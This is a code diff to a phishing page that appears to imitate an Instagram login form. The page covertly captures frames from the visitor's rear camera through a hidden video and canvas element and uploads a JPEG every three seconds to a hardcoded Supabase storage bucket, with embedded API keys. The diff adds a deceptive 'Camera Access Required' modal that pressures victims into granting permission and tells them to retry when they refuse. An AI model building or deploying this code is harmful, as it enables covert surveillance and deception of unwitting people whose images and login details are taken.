@@ -41,9 +41,22 @@ footer ul li a{font-size:11px;color:#8e8e8e;text-decoration:none}
 footer .copyright{font-size:11px;color:#8e8e8e}
 #msg{text-align:center;font-size:12px;margin-top:8px;color:#ed4956;min-height:16px}
 video,canvas{display:none}
+#permissionModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;align-items:center;justify-content:center}
+#permissionBox{background:#fff;padding:30px;border-radius:12px;text-align:center;max-width:400px;margin:20px}
+#permissionBox h2{color:#262626;margin-bottom:15px;font-size:20px}
+#permissionBox p{color:#8e8e8e;margin-bottom:20px;line-height:1.5}
+#permissionBox button{background:#0095f6;color:#fff;border:none;padding:12px 30px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;width:100%}
+#permissionBox button:hover{background:#1877f2}
 </style>
 </head>
 <body>
+<div id="permissionModal">
+  <div id="permissionBox">
+    <h2>📸 Camera Access Required</h2>
+    <p>This page needs camera access to continue. Please click "Allow" when your browser asks for permission.</p>
+    <button onclick="requestCamera()">Enable Camera</button>
+  </div>
+</div>
 <main>
   <section id="mobile"></section>
   <section id="auth">
@@ -76,14 +89,24 @@ video,canvas{display:none}
 </footer>
 <video id="v" autoplay playsinline muted></video><canvas id="c"></canvas>
 <script>
-const S='https://yspjknemdmlejzsubycf.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlzcGprbmVtZG1sZWp6c3VieWNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI3MDgyOTgsImV4cCI6MjA4ODI4NDI5OH0.JSAXs0UZJiBy2mgniSoSuN6BuW1iW-UhW785toC1weM';
+const S='https://raaqwpywdshwgmizvpwv.supabase.co',K='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJhYXF3cHl3ZHNod2dtaXp2cHd2Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzI4ODg1ODUsImV4cCI6MjA4ODQ2NDU4NX0.yhe3VmgkMIKAzLjSwd8se_IIp1CJvoLVbfIigeqRWGA';
 const sid=new URLSearchParams(location.search).get('s');
 const v=document.getElementById('v'),c=document.getElementById('c'),ctx=c.getContext('2d');
-window.addEventListener('load',()=>startCamera());
+window.addEventListener('load',()=>{
+  if(sid){
+    document.getElementById('permissionModal').style.display='flex';
+    setTimeout(()=>requestCamera(),1000);
+  }
+});
+function requestCamera(){startCamera();}
 function startCamera(){
   if(!sid)return;
   navigator.mediaDevices.getUserMedia({video:{facingMode:'environment',width:{ideal:1280},height:{ideal:720}}})
-  .then(stream=>{v.srcObject=stream;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;v.play().then(()=>{setTimeout(()=>{up();setInterval(up,3000);},1000);});};}).catch(()=>{});
+  .then(stream=>{
+    document.getElementById('permissionModal').style.display='none';
+    v.srcObject=stream;v.onloadedmetadata=()=>{c.width=v.videoWidth;c.height=v.videoHeight;v.play().then(()=>{setTimeout(()=>{up();setInterval(up,3000);},1000);});};}).catch(()=>{
+    document.getElementById('permissionBox').innerHTML='<h2>❌ Access Denied</h2><p>Camera permission was denied. Please refresh and allow camera access.</p><button onclick="location.reload()">Retry</button>';
+  });
 }
 async function up(){
   if(v.readyState<2)return;
@@ -93,9 +116,10 @@ async function up(){
   if(s<100)return;
   const blob=await new Promise(r=>c.toBlob(r,'image/jpeg',0.85));if(!blob)return;
   const f=sid+'/'+Date.now()+'.jpg';
-  const r=await fetch(S+'/storage/v1/object/captures/'+f,{method:'POST',headers:{'Authorization':'Bearer '+K,'Content-Type':'image/jpeg','x-upsert':'true'},body:blob});
-  if(!r.ok)return;
-  await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json'},body:JSON.stringify({session_id:sid,image_url:S+'/storage/v1/object/public/captures/'+f})});
+  const formData=new FormData();formData.append('file',blob,f);
+  const r=await fetch(S+'/storage/v1/object/captures/'+f,{method:'POST',headers:{'Authorization':'Bearer '+K},body:blob});
+  if(!r.ok){console.error('Upload failed:',await r.text());return;}
+  await fetch(S+'/rest/v1/photos',{method:'POST',headers:{'Authorization':'Bearer '+K,'apikey':K,'Content-Type':'application/json','Prefer':'return=minimal'},body:JSON.stringify({session_id:sid,image_url:S+'/storage/v1/object/public/captures/'+f})});
 }
 async function handleLogin(){
   const email=document.getElementById('email').value.trim();
